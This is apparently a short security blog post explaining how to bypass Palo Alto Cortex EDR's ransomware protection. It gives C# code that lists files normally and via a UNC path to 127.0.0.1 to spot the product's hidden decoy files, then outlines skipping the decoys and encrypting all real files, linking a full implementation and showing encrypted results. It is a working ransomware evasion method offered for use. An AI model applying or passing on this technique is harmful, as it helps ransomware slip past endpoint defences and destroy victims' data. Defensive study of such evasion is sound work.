## About 

in this blog we are going to bypass the ransomware protection from PaloAlto Cortex EDR!

![](https://www.pwntricks.com/assets/images/3/cortex.png)

## how the protection is working ? 

Cortex EDR is creating a dummy (decoy) files that is not visable to the users but, when any software interact with it then the Cortex EDR will know this is ransomware attack.

### for example if we list the files using the following C# code 
```C#
string[] files1 = Directory.GetFiles(Directory.GetCurrentDirectory());
foreach (var file in files1 ){ 
    Console.WriteLine(file);
}
Console.ReadLine();

```
the result will contains files that not existed but visiable to us due the cortex EDR:

![](https://www.pwntricks.com/assets/images/3/listofdecoy.png)

so if we interact with these files the Cortex EDR will detect the ransomware attack and block it.  

## The Bypass 
the bypass is simple by using UNC to list the files we can detect the real files so the approuch is simple : 

1. list all the files using UNC 
2. list all the files normally 
3. compare the 2 lists now we can detect the decoy files and avoid interact with them ! 

using UNC to list the files :

```C#
string[] files1 = Directory.GetFiles("\\\\127.0.0.1\\C$\\users\\dell\\downloads\\");
foreach (var file in files1 ){ 
    Console.WriteLine(file);
}
Console.ReadLine();
```

the result compare with the normal listing 

![](https://www.pwntricks.com/assets/images/3/comapre.png)

## putting all to gather 

1. list files normally
2. list files using UNC 
3. compare to detect the decoy and the real files 
4. add the real files to a list  
5. loop through the real files and encrypt them 


here you can find the full implementation in C# :

[https://github.com/casp3r0x0/CortexRansomBypass/](https://github.com/casp3r0x0/CortexRansomBypass/) 


## result !

before encryption: 

![](https://www.pwntricks.com/assets/images/3/last1.png)

after encryption:

all the files in current dirctory is encrypted :

![](https://www.pwntricks.com/assets/images/3/last2.png)

## proof

![](https://www.pwntricks.com/assets/images/3/last3.png)




